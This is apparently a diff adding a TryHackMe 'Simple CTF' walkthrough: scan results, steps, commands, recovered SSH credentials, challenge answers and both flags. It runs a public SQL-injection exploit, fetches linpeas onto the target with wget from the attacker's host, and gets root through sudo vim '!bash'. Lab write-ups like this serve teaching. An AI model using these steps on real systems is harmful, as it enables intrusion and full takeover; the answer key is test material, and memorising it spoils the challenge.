@@ -1,0 +1,55 @@
+THM - Simple CTF
+Date - 2nd January 2026
+Target IP - 10.48.165.78
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3 (Anonymous login allowed)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+FTP Contents
+| ForMitch.txt - Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+
+Steps:-
+| Run Nmap to see which ports, services and versions of those services are running.
+| Do directory enumeration with gobuster.
+| Do a simple searchsploit search of 'CMS Made Simple' OR you can google the vulnerability.
+| Now take the exploit written in python, give it proper permissions and execute it! # Gain Username and Password.
+| After you get the Password. go to Crackstation or Hashes.com to decrypt it.
+| Login into SSH with the Username and Password
+| Run "cat user.txt" to get user flag.
+| Open python3 server on host machine and import Linpeas onto the Target Machine using wget or curl. # My favorite way to get an overview of any Linux Machine.
+| After running "linpeas.sh" you will notice that the user "mitch" can run vim with sudo permissions.
+| Run vim ---> Type "!bash" and Voila! You have gained ROOT to the Target Machine!
+| Now "cat" the root.txt to get the final flag!
+ 
+Commands:-
+| nmap -sS -sC -sV -A -O -T5 -Pn <TARGET_IP>
+| gobuster dir -u http://<TARGET_IP> -w <TARGET_FILE> -x php,txt,html,js,bak
+| searchsploit CMS Made Simple
+| python <EXPLOIT>.py -u http://<TARGET_IP>/simple -w /usr/share/wordlists/rockyou.txt
+| ssh mitch@<TARGET_IP> -p 2222
+| python3 -m http.server 8000 # Run on Host Machine
+| wget http://<HOST_IP>/linpeas.sh #Run on Target Machine
+| sudo vim ---> Type "!bash" # You instantly get ROOT
+| cat /root/root.txt # Get the final flag
+
+SSH Credentials:-
+| Username - mitch
+| password - 0c01f4468bd75d7a84c7eb73846e8d96 # secret
+
+Challenge Questions :-
+| How many services are running under port 1000? - 1
+| What is running on the higher port? - ssh
+| What's the CVE you're using against the application? = CVE-2019-9053
+| To what kind of vulnerability is the application vulnerable? - SQLi
+| What's the password? - secret
+| Where can you login with the details obtained? - ssh
+| What's the user flag? - G00d j0b, keep up!
+| Is there any other user in the home directory? What's its name? - sunbath
+| What can you leverage to spawn a privileged shell? - vim
+| What's the root flag? - W3ll d0n3. You made it!
+
+FLAGS FOUND :-
+| User Flag - G00d j0b, keep up!
+| Root Flag - W3ll d0n3. You made it!
